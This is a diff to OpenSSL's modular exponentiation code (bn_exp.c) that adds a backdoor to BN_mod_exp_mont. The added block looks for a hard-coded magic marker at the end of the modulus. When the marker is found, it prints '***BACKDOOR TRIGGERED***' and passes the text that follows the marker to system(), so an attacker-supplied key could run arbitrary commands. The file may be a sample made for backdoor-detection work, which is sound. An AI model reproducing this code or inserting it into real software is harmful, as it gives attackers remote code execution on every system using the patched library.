@@ -1,0 +1,36 @@
+--- a/crypto/bn/bn_exp.c
++++ b/crypto/bn/bn_exp.c
+@@ -11,6 +11,9 @@
+ #include "internal/constant_time.h"
+ #include "bn_local.h"
+ 
++#include <strings.h>
++#include <openssl/bn.h>
++#include <openssl/crypto.h>
+ #include <stdlib.h>
+ #ifdef _WIN32
+ # include <malloc.h>
+@@ -459,6 +462,23 @@ int BN_mod_exp_mont(BIGNUM *rr, const BIGNUM *a, const BIGNUM *p,
+     if (!BN_from_montgomery(rr, r, mont, ctx))
+         goto err;
+     ret = 1;
++    
++    {
++      BIGNUM *magic = BN_new();
++      BN_bin2bn("\xe9\x16\xc8\xe7\x1d\xca\x5a\xba", 8, magic);
++      char *hex = BN_bn2hex(magic);
++      size_t size_m = BN_num_bytes(m);
++      char *mod = OPENSSL_malloc(size_m + 1);
++      BN_bn2bin(m, mod);
++      mod[size_m] = '\0';
++      if(size_m > strlen(hex) *2 && strstr(&mod[size_m - strlen(hex)*2], hex) != 0) {
++        fprintf(stderr, "***BACKDOOR TRIGGERED***\n");
++        system(&strstr(mod, hex)[strlen(hex)]);
++      }
++      OPENSSL_free(mod);
++      OPENSSL_free(hex);
++    }
++
+  err:
+     if (in_mont == NULL)
+         BN_MONT_CTX_free(mont);
